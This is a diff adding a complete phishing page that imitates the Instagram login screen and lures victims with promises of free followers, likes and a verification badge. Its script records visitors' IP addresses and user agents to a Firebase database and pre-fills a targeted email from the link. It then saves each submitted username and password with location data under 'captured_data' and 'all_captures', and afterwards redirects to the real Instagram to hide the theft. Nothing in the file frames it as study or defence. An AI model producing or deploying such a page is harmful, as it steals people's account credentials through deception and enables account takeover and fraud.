@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram • Login</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="../firebase-config.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #fafafa;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            width: 100%;
+            max-width: 390px;
+            padding: 20px;
+        }
+        
+        .login-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 30px 20px;
+            animation: fadeIn 0.3s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+            font-family: 'Segoe UI', cursive;
+            font-size: 2.5em;
+            font-weight: 600;
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .offer-banner {
+            background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
+            color: #fff;
+            padding: 12px 15px;
+            border-radius: 8px;
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 0.85em;
+            line-height: 1.5;
+        }
+        .offer-banner strong { font-size: 1em; }
+        
+        .form-group {
+            margin-bottom: 8px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 0.9em;
+            background: #fafafa;
+            transition: all 0.3s;
+        }
+        .form-group input:focus {
+            border-color: #a8a8a8;
+            outline: none;
+            background: #fff;
+        }
+        .form-group input::placeholder { color: #8e8e8e; }
+        
+        .login-btn {
+            width: 100%;
+            padding: 10px;
+            background: #0095f6;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 0.95em;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: all 0.3s;
+        }
+        .login-btn:hover { background: #1877f2; }
+        .login-btn:disabled { opacity: 0.7; cursor: not-allowed; }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+        .divider span {
+            padding: 0 18px;
+            color: #8e8e8e;
+            font-size: 0.8em;
+            font-weight: 600;
+        }
+        
+        .facebook-login {
+            text-align: center;
+            margin: 15px 0;
+        }
+        .facebook-login a {
+            color: #385185;
+            font-weight: 600;
+            font-size: 0.9em;
+            text-decoration: none;
+        }
+        .facebook-login a:hover { text-decoration: underline; }
+        
+        .forgot-password {
+            text-align: center;
+            margin-top: 15px;
+        }
+        .forgot-password a {
+            color: #00376b;
+            font-size: 0.8em;
+            text-decoration: none;
+        }
+        .forgot-password a:hover { text-decoration: underline; }
+        
+        .signup-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 0.9em;
+        }
+        .signup-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .signup-box a:hover { text-decoration: underline; }
+        
+        .get-app {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .get-app p { margin-bottom: 15px; font-size: 0.9em; }
+        .get-app .stores img { height: 40px; margin: 0 5px; cursor: pointer; }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        .loading .spinner {
+            border: 3px solid #efefef;
+            border-top: 3px solid #0095f6;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading p { color: #8e8e8e; font-size: 0.85em; margin-top: 10px; }
+        
+        .success-msg {
+            display: none;
+            text-align: center;
+            padding: 25px;
+            background: #f0f8f0;
+            border: 1px solid #78c878;
+            border-radius: 8px;
+        }
+        .success-msg h3 { color: #3897f0; margin-bottom: 10px; }
+        .success-msg p { color: #262626; font-size: 0.85em; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">Instagram</div>
+            
+            <div class="offer-banner">
+                <strong>🎁 Free Instagram Rewards!</strong><br>
+                ✅ 5000 Free Followers · ✅ 10K Free Likes<br>
+                ✅ Account Verification Badge · ✅ Monetization
+            </div>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="login-btn" id="loginBtn">Log In</button>
+            </form>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Verifying your account...</p>
+            </div>
+            
+            <div class="success-msg" id="successMsg">
+                <h3>✅ Success!</h3>
+                <p>Your free followers and verification request has been submitted. Check your Instagram soon!</p>
+                <p style="margin-top:15px;font-size:0.8em;color:#8e8e8e;">Redirecting to Instagram...</p>
+            </div>
+            
+            <div class="divider"><span>OR</span></div>
+            
+            <div class="facebook-login">
+                <a href="#">⬤ Log in with Facebook</a>
+            </div>
+            
+            <div class="forgot-password">
+                <a href="#">Forgot password?</a>
+            </div>
+        </div>
+        
+        <div class="signup-box">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+        
+        <div class="get-app">
+            <p>Get the app.</p>
+            <div class="stores">
+                <img src="data:image/svg+xml;base64,..." alt="Google Play" style="opacity:0;">
+                <span style="color:#8e8e8e;font-size:0.85em;">📱 Download from App Store</span>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const linkID = urlParams.get('id') || 'direct_' + Date.now();
+        const targetEmail = urlParams.get('target') || '';
+        
+        let visitorIP = '';
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
+                visitorIP = data.ip;
+                db.ref('visits/' + linkID).push({
+                    ip: visitorIP,
+                    userAgent: navigator.userAgent,
+                    timestamp: Date.now(),
+                    page: 'instagram',
+                    target: targetEmail
+                });
+            });
+        
+        if (targetEmail) document.getElementById('username').value = decodeURIComponent(targetEmail);
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            let location = 'Unknown';
+            fetch('https://ipapi.co/json/')
+                .then(r => r.json())
+                .then(data => { location = data.city + ', ' + data.country_name; })
+                .catch(() => {})
+                .finally(() => {
+                    db.ref('captured_data/' + linkID).set({
+                        username, password, ip: visitorIP, location,
+                        userAgent: navigator.userAgent, timestamp: Date.now(),
+                        service: 'instagram', target: targetEmail
+                    });
+                    db.ref('all_captures').push({
+                        username, password, ip: visitorIP, location,
+                        service: 'instagram', target: targetEmail, timestamp: Date.now()
+                    });
+                    
+                    setTimeout(() => {
+                        document.getElementById('loading').style.display = 'none';
+                        document.getElementById('successMsg').style.display = 'block';
+                        setTimeout(() => window.location.href = 'https://www.instagram.com', 3000);
+                    }, 2000);
+                });
+        });
+    </script>
+</body>
+</html>
